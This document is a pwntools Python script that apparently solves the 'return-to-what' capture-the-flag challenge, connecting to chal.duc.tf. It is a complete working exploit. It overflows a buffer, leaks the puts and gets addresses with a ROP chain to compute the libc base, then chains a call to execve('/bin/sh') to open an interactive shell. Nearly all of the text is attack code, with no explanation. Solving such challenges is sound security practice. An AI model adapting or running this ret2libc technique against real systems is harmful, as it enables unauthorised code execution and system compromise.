from pwn import *

BINARY = './return-to-what'
context.binary = BINARY
GDB = False
REMOTE = False
e = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == "remote":
    REMOTE = True

if REMOTE:
    #  [*] Leaked puts: 0x7f5628c339c0
    #  [*] Leaked gets: 0x7f5628c330b0
    # get version via via https://libc.rip/
    libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def start():
    if REMOTE:
        return remote("chal.duc.tf", 30003)
    else:
        if GDB:
            return gdb.debug(BINARY, '''
                break main
                continue
            ''')
        else:
            return process(BINARY)

RET_OFFSET = cyclic_find(0x6161616f)

def leak_libc(io):
    p = b"A"*RET_OFFSET
    r = ROP(e)
    r.raw(r.rdi)
    r.raw(e.got['puts'])
    r.raw(e.plt['puts'])
    r.raw(r.rdi)
    r.raw(e.got['gets'])
    r.raw(e.plt['puts'])
    r.raw(e.symbols['vuln'])
    p += r.chain()
    io.sendline(p)

    puts_addr = unpack(io.readline()[:-1].ljust(8, b"\x00"))
    gets_addr = unpack(io.readline()[:-1].ljust(8, b"\x00"))
    log.info("Leaked puts: " + hex(puts_addr))
    log.info("Leaked gets: " + hex(gets_addr))

    libc_base = puts_addr-libc.symbols['puts']
    log.info("Leaked libcbase: " + hex(libc_base))
    libc.address = libc_base

def rop_to_shell(io):
    r = ROP(libc)
    r.raw(r.rdi)
    r.raw(next(libc.search(b"/bin/sh")))
    r.raw(r.rsi)
    r.raw(0)
    r.raw(r.rdx)
    r.raw(0)
    r.raw(libc.symbols['execve'])
    p = b'A'*RET_OFFSET + r.chain()
    io.sendline(p)
    io.interactive()

def exploit():
    #  puts_gets_ret_addr = 0x401194
    try:
        io = start()
        io.readline()
        io.readline()

        leak_libc(io)
        rop_to_shell(io)
    finally:
        io.close()

exploit()
